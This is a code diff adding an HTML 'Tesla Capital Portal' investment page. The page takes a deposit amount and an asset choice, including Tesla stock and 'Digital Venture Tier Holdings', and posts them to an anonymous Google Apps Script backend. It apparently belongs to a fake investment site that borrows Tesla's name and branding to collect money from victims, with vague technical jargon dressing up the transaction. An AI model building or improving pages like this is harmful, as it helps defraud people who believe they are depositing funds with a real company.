@@ -1,1 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Capital Portal - Invest</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    </style>
+</head>
+<body class="text-white min-h-screen flex flex-col justify-between pb-8">
 
+    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d]">
+        <a href="dashboard.html" class="text-neutral-400 hover:text-white flex items-center text-sm">
+            ‹ Back to Hub
+        </a>
+        <span class="text-xs font-bold tracking-widest text-[#E82127] uppercase">Capital Deposit</span>
+        <div class="w-12"></div>
+    </header>
+
+    <main class="max-w-md w-full mx-auto px-4 mt-6 flex-grow">
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-6 shadow-2xl">
+            <h2 class="text-xl font-bold tracking-tight mb-1">Fund Allocation</h2>
+            <p class="text-xs text-neutral-400 mb-6">Select your transaction profile parameters.</p>
+
+            <div id="statusBox" class="hidden mb-4 p-4 text-sm rounded-xl border"></div>
+
+            <form id="investForm" class="space-y-5">
+                <div>
+                    <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Deposit Target Class</label>
+                    <select id="assetSelect" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
+                        <option value="Tesla Stock (TSLA)">Tesla Common Stock (TSLA)</option>
+                        <option value="Cash Reserves">USD Vault Cash Balance</option>
+                        <option value="Digital Assets Venture">Digital Venture Tier Holdings</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Funding Amount (USD)</label>
+                    <div class="relative">
+                        <span class="absolute left-4 top-3 text-neutral-500 font-medium text-sm">$</span>
+                        <input type="number" id="investAmount" required min="10" placeholder="0.00" 
+                            class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl pl-8 pr-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm font-semibold">
+                    </div>
+                </div>
+
+                <button type="submit" id="submitBtn" 
+                    class="w-full bg-[#E82127] hover:bg-[#c61a1f] active:scale-[0.99] text-white font-medium py-3.5 rounded-xl transition-all text-sm shadow-lg shadow-red-900/20 mt-4">
+                    Initialize Capital Integration
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
+        const userId = localStorage.getItem("userId");
+
+        if (!userId) {
+            window.location.href = "index.html";
+        }
+
+        document.getElementById('investForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const statusBox = document.getElementById('statusBox');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            statusBox.classList.add('hidden');
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Transmitting processing arrays...";
+
+            const payload = {
+                action: "submitInvestment",
+                userId: userId,
+                amount: parseFloat(document.getElementById('investAmount').value),
+                asset: document.getElementById('assetSelect').value
+            };
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    mode: "cors",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+
+                if (result.status === "success") {
+                    statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-emerald-950/30 border-emerald-900 text-emerald-400";
+                    statusBox.innerText = "Capital submission recorded. Redirecting to account deck...";
+                    statusBox.classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        window.location.href = "dashboard.html";
+                    }, 2000);
+                } else {
+                    throw new Error(result.message);
+                }
+            } catch (err) {
+                statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-red-950/30 border-red-900 text-red-400";
+                statusBox.innerText = err.message || "Failed to establish secure proxy channel.";
+                statusBox.classList.remove('hidden');
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Initialize Capital Integration";
+            }
+        });
+    </script>
+</body>
+</html>
